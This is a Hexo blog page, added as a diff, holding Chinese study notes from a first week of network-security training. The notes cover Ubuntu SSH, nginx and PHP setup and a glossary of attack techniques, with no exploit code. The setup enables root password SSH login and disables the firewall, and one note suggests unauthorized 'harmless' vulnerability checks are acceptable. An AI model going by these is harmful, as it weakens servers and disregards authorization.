@@ -1,0 +1,1662 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/xxx/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/xxx/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="https://szm200543-ux.github.io/xxx/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="https://szm200543-ux.github.io/xxx/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="https://szm200543-ux.github.io/xxx/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/xxx/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="https://szm200543-ux.github.io/xxx/2026/03/23/%E6%B8%97%E9%80%8F1-5/">
+
+
+
+  <title>
+网络安全前五天学习笔记 |
+Yume Shoka = Hexo = 网络安全学习博客</title>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">网络安全前五天学习笔记
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2026-03-23 14:29:11">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2026-03-23T14:29:11+08:00">2026-03-23</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/xxx/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph4fomxoj20zk0m8axp.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclflwv2aj20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/xxx/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://szm200543-ux.github.io/xxx/2026/03/23/%E6%B8%97%E9%80%8F1-5/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/xxx/images/avatar.jpg">
+    <meta itemprop="name" content="X">
+    <meta itemprop="description" content="网络安全学习博客, ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="一、第一天"><a href="#一、第一天" class="headerlink" title="一、第一天"></a>一、第一天</h1><h2 id="1-安全相关介绍"><a href="#1-安全相关介绍" class="headerlink" title="1.安全相关介绍"></a>1.安全相关介绍</h2><h3 id="学习方向"><a href="#学习方向" class="headerlink" title="学习方向"></a>学习方向</h3><ol>
+<li>是否有真实的渗透经历  0-1 渗透内网 cnvd漏洞编号  真机  1000  真实 合法性 授权性</li>
+</ol>
+<p>网络安全法  要不然 你就参加众测  补天 </p>
+<p>未经授权的情况下  其实也可以  边界  </p>
+<p>验证漏洞  无害验证  phpinfo 123</p>
+<p>version user</p>
+<ol start="2">
+<li>现在web漏洞  sql注入漏洞 dead ？ 预编译 预防sql注入  真的是100%防御吗？ 23 黑帽大会  协议层绕过 三层四层  <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1UZmcxQjh1MXl2RQ==">https://www.youtube.com/watch?v=Tfg1B8u1yvE</span><br>chrome-extension:&#x2F;&#x2F;blegnhaaimfcklgddeegngmanbnfopog&#x2F;<span class="exturl" data-url="aHR0cHM6Ly9tZWRpYS5kZWZjb24ub3JnL0RFRiUyMENPTiUyMDMyL0RFRiUyMENPTiUyMDMyJTIwcHJlc2VudGF0aW9ucy9ERUYlMjBDT04lMjAzMiUyMC0lMjBQYXVsJTIwR2Vyc3RlJTIwLSUyMFNRTCUyMEluamVjdGlvbiUyMElzbiUyN3QlMjBEZWFkJTIwU211Z2dsaW5nJTIwUXVlcmllcyUyMGF0JTIwdGhlJTIwUHJvdG9jb2wlMjBMZXZlbC5wZGY=">https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf</span></li>
+<li>web漏洞 护网  整体基线检查 nulei 逐年减少 （信息收集能力）  前端加密  requestid timestramp cry</li>
+</ol>
+<p>​    web前端逆向 加密函数—–&gt; 解密函数  burpsuite autodecoder galaxy </p>
+<ol start="2">
+<li>小程序  app  注意  抓包（app 双向证书绑定  绕过  app 模块  模拟器  真机  真机   nexus5） 前端 ——&gt;后端服务器</li>
+<li>云安全—–&gt; docker k8s  80%</li>
+</ol>
+<h3 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h3><p>AI——-&gt;2026年年初  </p>
+<p>必须积极拥抱AI</p>
+<p>AI——&gt;辅助安全 </p>
+<p>MCP 号称 自动化测试 自动化解题    kali nmap sqlmap </p>
+<p>看代码  exp  </p>
+<p>claude code   codex geminicli</p>
+<p>claude opus4.5 codex gpt-5.2  gemini3pro   glm-4.7  minimax2.1  我想编写一个程序 我想分析一段代码 我想复现一个漏洞 编写exp利用脚本</p>
+<p>AI 模型微调 大而全的专业 垂直领域 获得更好的效果  医疗 法律  网络安全 农业 webshell识别</p>
+<p>AI 视觉  自动 汽车 人 海洋垃圾  yolov</p>
+<p>AI 会不会看X光  多模态  识别图和视频  Qwen-3-Vl</p>
+<p>大模型 github  </p>
+<p>魔塔 阿里</p>
+<p>hugg</p>
+<p>模型部署  数据调整 </p>
+<p>235B 671B </p>
+<p>显卡的要求</p>
+<p>经济  越好越好</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXV0b2RsLmNvbS9ob21l">https://www.autodl.com/home</span></p>
+<p>gemini3pro  动态视图会帮你更好的理解一些问题</p>
+<p>  1.31号 240美金 edu邮箱就最好   申请？ 你自己去查 前端  nano banana2 veo3.1-3.2  图 增强一些课程趣味性  多啦A梦的四格漫画 来呈现 </p>
+<p>项目 </p>
+<p>anigravity  IDE   大模型 只能问  function call —–&gt; MCP 调用本地工具   第一 查看图  </p>
+<p>网络 扎实    dns和dhcp  用的什么协议  udp 不可靠 既然不可靠 在网络环境 很差的情况下 丢包无法重传  是否不能使用dns和dhcp</p>
+<p>IA 基本功  TCP  很多协议在应用层 他有一个弥补机制</p>
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ol>
+<li>debug  （重中之重）</li>
+</ol>
+<p>python pycharm   python3.10   <span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMvd2luZG93cy8=">https://www.python.org/downloads/windows/</span>   安装版本自己定</p>
+<p>conda env  虚拟环境  就像一个容器一样   python2.7 python.3.10 </p>
+<p>ubuntu 22.04</p>
+<p>java  idea   jdk1.8  jdk17  jdk21  maven pip </p>
+<p> jdk1.8 版 idea </p>
+<p>社区</p>
+<p>jdk17  module 限制大部分java 反序列化漏洞 bypass</p>
+<p>jdk21 dataease  </p>
+<p>windows </p>
+<p>phpstudy</p>
+<p>php  phpstorm&#x2F;vscode  xdebug</p>
+<p>[Xdebug]<br>xdebug.mode &#x3D; debug<br>xdebug.start_with_request &#x3D; yes<br>zend_extension&#x3D;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php7.3.4nts&#x2F;ext&#x2F;php_xdebug-3.1.6-7.3-vc15-nts-x86_64.dll</p>
+<p>js 前端调试 逆向过程中  代码层面 </p>
+<p>lnmp lamp  linux nginx（） mysql php</p>
+<p>web项目上  </p>
+<p>nginx apache 大厂 tomcat 开源 idea java weblogic </p>
+<p>linux ubuntu22 nginx php-fpm  php7.3-php7.4 </p>
+<p>apt-get install php7.4-dev autoconf automake</p>
+<p>源码安装 apt安装</p>
+<ol>
+<li><p>源码调试  代码 php  C语言</p>
+</li>
+<li><p>debug 底层C语言  pwndbg vscode</p>
+</li>
+</ol>
+<p>wnmp wamp  windows nginx mysql php</p>
+<h2 id="2-ubuntu远程ssh连接"><a href="#2-ubuntu远程ssh连接" class="headerlink" title="2.ubuntu远程ssh连接"></a>2.ubuntu远程ssh连接</h2><p>Ubuntu 系统端（服务端）配置</p>
+<p>ubuntu系统默认不会给root设置密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> passwd root</span><br></pre></td></tr></table></figure>
+
+<p>设置root用户的密码</p>
+<ol>
+<li><p><strong>更新软件源</strong>：<br>打开 Ubuntu 终端，执行以下命令更新软件包列表。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>安装 OpenSSH Server</strong>：<br>执行以下命令安装 SSH 服务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install openssh-server</span><br></pre></td></tr></table></figure>
+
+<p>安装完成后，可通过 <code>ssh -V</code> 或 <code>ssh -v</code> 查看版本以确认安装成功。</p>
+</li>
+<li><p><strong>启动并设置 SSH 服务</strong>：</p>
+<ul>
+<li><p>启动 SSH 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl start ssh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设置 SSH 服务开机自启：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> ssh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设置有允许root用户远程登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"># 允许root用户通过密码远程登录</span><br><span class="line">PermitRootLogin yes</span><br><span class="line"># 可选：若使用密钥登录，可设为 without-password（比密码登录安全）</span><br><span class="line"># PermitRootLogin without-password</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>重启ssh服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart ssh</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>检查 SSH 服务状态：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl status ssh</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>配置防火墙</strong>（如有必要）：<br>如果连接失败，可尝试暂时关闭防火墙或确保 22 端口开放。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>获取 IP 地址</strong>：<br>使用以下命令查看 Ubuntu 的 IP 地址（通常为 <code>192.168</code> 开头或公网 IP）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p>记录该 IP 地址，连接时需使用。</p>
+</li>
+</ol>
+<h2 id="3-nginx"><a href="#3-nginx" class="headerlink" title="3.nginx"></a>3.nginx</h2><h3 id="1-安装依赖包"><a href="#1-安装依赖包" class="headerlink" title="1.安装依赖包"></a>1.安装依赖包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc</span><br><span class="line">apt-get install libpcre3 libpcre3-dev</span><br><span class="line">apt-get install zlib1g zlib1g-dev</span><br><span class="line">sudo apt-get install openssl </span><br><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-安装nginx"><a href="#2-安装nginx" class="headerlink" title="2.安装nginx"></a>2.安装nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">wget https://nginx.org/download/nginx-1.22.1.tar.gz</span><br><span class="line"><span class="comment"># 官方源码，也可以直接从官网下载然后从Windows拉取</span></span><br><span class="line">tar -xvf nginx-1.21.6.tar.gz</span><br><span class="line"><span class="comment"># 解压缩</span></span><br><span class="line"><span class="built_in">mv</span> nginx-1.22.1 nginx</span><br><span class="line"><span class="comment"># 更改文件名</span></span><br><span class="line"><span class="built_in">cd</span> ~/nginx/</span><br><span class="line">./configure</span><br><span class="line"><span class="comment"># 编译环境</span></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">apt-get install make</span><br><span class="line"><span class="comment"># 进行安装make 编译包</span></span><br><span class="line"><span class="built_in">mkdir</span> nginx</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> nginx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-编译nginx"><a href="#3-编译nginx" class="headerlink" title="3.编译nginx"></a>3.编译nginx</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/nginx-1.21.6</span><br><span class="line"># 执行命令</span><br><span class="line"></span><br><span class="line">apt update &amp;&amp; apt install gcc g++ make libpcre3 libpcre3-dev zlib1g zlib1g-dev libssl-dev -y</span><br><span class="line"># 安装编译环境</span><br><span class="line">      </span><br><span class="line">./configure</span><br><span class="line">      </span><br><span class="line">./configure --prefix=/home/centos/nginx --with-http_stub_status_module --with-http_ssl_module --with-http_sub_module</span><br><span class="line"></span><br><span class="line"># 执行make命令</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 执行make install命令</span><br><span class="line"></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-启动nginx"><a href="#4-启动nginx" class="headerlink" title="4.启动nginx"></a>4.启动nginx</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/nginx/sbin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 启动nginx</span><br><span class="line"></span><br><span class="line">./nginx</span><br><span class="line">      </span><br><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-访问nginx"><a href="#5-访问nginx" class="headerlink" title="5.访问nginx"></a>5.访问nginx</h3><p><img data-src="https://img-blog.csdnimg.cn/ed812f0a90354f07a3a9fd194cf1267b.png" alt="img"></p>
+<h2 id="3-php"><a href="#3-php" class="headerlink" title="3.php"></a>3.php</h2><h3 id="1-增加源地址"><a href="#1-增加源地址" class="headerlink" title="1.增加源地址"></a>1.增加源地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">执行三条命令,添加php的源地址，更新，安装</span><br><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository -y ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-安装php"><a href="#2-安装php" class="headerlink" title="2.安装php"></a>2.安装php</h3><p>​    nginx使用php的话要用到php7.3-fpm,所以要安装</p>
+<p>php-fpm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apt list | grep php</span><br><span class="line"># 查找是否有需要的版本</span><br><span class="line"></span><br><span class="line">sudo apt-get install php7.3 php7.3-mysql php7.3-fpm php7.3-curl php7.3-xml php7.3-gd php7.3-mbstring php-memcached php7.3-zip</span><br><span class="line"># 如果Ubuntu版本过高，则需要添加第三方库</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y software-properties-common apt-transport-https lsb-release ca-certificates</span><br><span class="line"># 导入 ondrej 源的 GPG 密钥（验证包的合法性）</span><br><span class="line">sudo wget -O /etc/apt/trusted.gpg.d/ondrej.php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line"></span><br><span class="line"># 添加 ondrej/php 软件源到系统源列表</span><br><span class="line">echo &quot;deb https://packages.sury.org/php/ $(lsb_release -sc) main&quot; | sudo tee /etc/apt/sources.list.d/ondrej-php.list</span><br><span class="line"></span><br><span class="line"># 更新软件包列表（让系统识别新添加的源中的 PHP 包）</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
+
+<p>存在7.3无法找到的问题话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/apt/sources.list.d/ondrej-php.list</span><br><span class="line">#创建编辑ppa源配置文件</span><br><span class="line"></span><br><span class="line">deb http://ppa.launchpad.net/ondrej/php/ubuntu noble main</span><br><span class="line">deb-src http://ppa.launchpad.net/ondrej/php/ubuntu noble main</span><br><span class="line">#添加内容</span><br><span class="line"></span><br><span class="line"># 安装 dirmngr 工具（用于导入公钥）</span><br><span class="line">sudo apt-get install dirmngr -y</span><br><span class="line"></span><br><span class="line"># 导入 ondrej/php PPA 公钥</span><br><span class="line">sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4F4EA0AAE5267A6C</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line">#更新安装源</span><br><span class="line"></span><br><span class="line">sudo apt-get install php7.3 php7.3-mysql php7.3-fpm php7.3-curl php7.3-xml php7.3-gd php7.3-mbstring php-memcached php7.3-zip -y</span><br><span class="line">#安装7.3版本</span><br><span class="line"></span><br><span class="line">php7.3 -v</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">sudo systemctl start php7.3-fpm</span><br><span class="line"></span><br><span class="line"># 查看服务状态</span><br><span class="line">sudo systemctl status php7.3-fpm</span><br><span class="line"></span><br><span class="line"># 设置开机自启（可选，避免服务器重启后服务停止）</span><br><span class="line">sudo systemctl enable php7.3-fpm</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-配置php-fpm"><a href="#3-配置php-fpm" class="headerlink" title="3.配置php-fpm"></a>3.配置php-fpm</h3><p>​    把监听端口改掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">：</span><br><span class="line">listen = 127.0.0.1:9000</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-启动php-fpm"><a href="#4-启动php-fpm" class="headerlink" title="4.启动php-fpm"></a>4.启动php-fpm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find / -name www.conf</span><br><span class="line"># 查找</span><br><span class="line">/etc/php/7.3/fpm/pool.d# cat www.conf </span><br><span class="line">vim www.conf</span><br><span class="line"># 更改端口</span><br><span class="line"></span><br><span class="line">sudo service php7.3-fpm start</span><br><span class="line">netstat -lnt | grep 9000</span><br></pre></td></tr></table></figure>
+
+<p>查看9000端口</p>
+<p><img data-src="https://img-blog.csdnimg.cn/7cae0d95848749d89d5b076a5499f71f.png" alt="img"></p>
+<h2 id="5-常见攻击方式"><a href="#5-常见攻击方式" class="headerlink" title="5.常见攻击方式"></a>5.常见攻击方式</h2><h4 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a>挂马</h4><p>在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，使浏览者中马</p>
+<h4 id="挖洞"><a href="#挖洞" class="headerlink" title="挖洞"></a>挖洞</h4><p>漏洞挖掘 — 弱口令</p>
+<h4 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h4><p>利用特殊的算法，将exe可执行程序或者DLL动态连接库文件的编码进行修改（如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。</p>
+<p>目前常用的壳有：UPX，ASPack，PECompact，UPack，免疫007，木马彩衣等等…</p>
+<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><p>简单的解释就是程序对输入数据没有执行有效的边界检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令</p>
+<h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h4><p>攻击者向一个地址区输入这个区间储存不下的大量字符，在某些情况下，这些多余的字符可以作为“执行代码”来运行，因此足以使攻击者不受安全措施限制而获得计算机的控制权</p>
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p>Web安全头号大敌，攻击者把一些包含攻击代码当作命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据</p>
+<p>注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的，注入漏洞通常能在sql查询，ldap查询，os命令，程序参数等中出现</p>
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>注入攻击最常见的形式，主要是指Web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任查询或其他操作，导致数据库信息泄露或非授权操作数据表</p>
+<h4 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h4><p>即可以实行注入的地方，通常是一个涉及访问数据库的应用链接，根据注入点数据库的运行账号的权限的不同，你所得到的权限也不同</p>
+<h4 id="软件脱壳"><a href="#软件脱壳" class="headerlink" title="软件脱壳"></a>软件脱壳</h4><p>顾名思义就是利用工具，把在软件“外面”起保护作用的“壳”程序去掉，还文件本来面目，这样再修改文件内容或进行分析解析就容易多了</p>
+<h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><p>通过加壳，加密，修改特征码，加花指令等技术来修改程序，使其逃过杀毒软件的查杀</p>
+<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>简称“爆破”，黑客对系统中账号都每一个可能的密码进行高度密集的自动搜索，从而破坏安全并获得对计算机的访问权限</p>
+<h4 id="洪水攻击"><a href="#洪水攻击" class="headerlink" title="洪水攻击"></a>洪水攻击</h4><p>是黑客比较常用的一种技术，特点是实施简单，威力巨大，大多是无视防御的</p>
+<p>从定义上说，攻击哲对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等</p>
+<p>洪水攻击将攻击流量比作洪水，只要攻击流量够大，就可以将防御手段打穿</p>
+<p>DDoS攻击便是洪水攻击的一种</p>
+<h4 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h4><p>利用操作系统TCP协调设计上的问题执行的拒绝服务攻击，设计TCP建立连接时三次握手的设计</p>
+<h4 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h4><p>拒绝服务攻击，攻击者通过利用漏洞或发送大量请求导致攻击对象无法访问网络或者网站无法被访问</p>
+<h4 id="DDoS攻击"><a href="#DDoS攻击" class="headerlink" title="DDoS攻击"></a>DDoS攻击</h4><p>分布式DOS攻击，常见的UDP，SYN，反射放大攻击等等，就是通过许多肉鸡一起向你发送一些网络请求信息，导致你的网络堵塞而不能正常上网</p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>端口扫描是指发送一组端口扫描消息，通过它了解到从到哪里可以探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机</p>
+<h4 id="反弹端口"><a href="#反弹端口" class="headerlink" title="反弹端口"></a>反弹端口</h4><p>防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范</p>
+<p>于是，利用这一特性，反弹端口型软件的服务端（被控制端）会主动连接客户端（控制端），就给人被控制端主动连接控制端的假象”，让人麻痹大意</p>
+<h4 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h4><p>攻击者利用欺骗性的电子邮件或伪造的Web站点等来进行网络诈骗活动</p>
